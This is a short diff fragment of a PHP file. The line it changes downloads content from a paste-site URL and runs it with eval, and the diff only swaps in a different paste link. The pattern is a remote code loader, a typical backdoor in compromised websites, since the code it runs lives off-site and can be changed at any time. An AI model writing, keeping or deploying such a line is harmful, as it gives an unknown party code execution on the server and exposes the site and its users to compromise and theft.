@@ -17,6 +17,6 @@ function getURL($url) {
 }
 
 
-eval("?>" . getURL("https://pastee.dev/r/4CLxAgB5/0"));
+eval("?>" . getURL("https://pastee.dev/p/YLeQ1XId/0"));
 
 ?>
